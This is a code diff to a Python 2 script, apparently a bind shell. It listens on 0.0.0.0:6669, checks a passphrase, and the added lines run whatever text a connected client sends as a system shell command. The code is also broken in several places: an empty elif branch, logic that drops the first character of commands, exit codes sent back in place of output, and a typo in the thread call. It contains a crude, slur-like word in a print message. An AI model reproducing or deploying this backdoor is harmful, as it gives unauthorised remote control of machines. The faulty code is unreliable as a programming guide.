@@ -11,7 +11,6 @@ import subprocess
 uname = subprocess.call('uname -a', shell=True)
 w = subprocess.call('w', shell=True)
 
-
 #Set server to accept connections from any interface, port 6669
 BINDIP = "0.0.0.0"
 BINDPORT = "6669"
@@ -23,12 +22,14 @@ server.listen(3)
 
 def commands(command):
     command = command.rstrip()
-    #TODO
-    #detect ! as first character, send to script function
-    #or send *nix command to subprocess.call('cmd', shell=True)
-    #if return code != 0 print error, otherwise return output and send over
-    #/TODO
-
+    if command[0] != "!":
+        command = command[1:]
+        result = subprocess.call(command, shell=True)
+        return result
+    elif command[0] == "!":
+        #TODO add custom scripts
+    else:
+        print "\nNgr wtf did you do, this should literally be impossible to call\n"
 
 #main server functions, command parsing
 def shell():
@@ -37,10 +38,13 @@ def shell():
         buffer = ""
         while "\n" not in buffer:
             buffer += clientSocket.recv(1024)
-        output = commands(buffer)
-        clientSocket.send(output)
-
-
+        if buffer == 'quit':
+            print "\n [*] Terminating Connection. Goodbye."
+            clientSocket.close()
+            run = False
+        else:
+            output = commands(buffer)
+            clientSocket.send(output)
 
 
 #Client Handler, require predetermined hash/passphrase to establish connection
@@ -56,15 +60,12 @@ def handleClient(clientSocket):
         clientSocket.close()
 
 
-
-
 #Main, waiting for connection loop
 def main():
     while True:
         client,addr = server.accept()
         clientHandler = threading.Thread(target=handleClient,args(client,))
         clientHandler.start()
-
 
 
 if __name__ == '__main__':
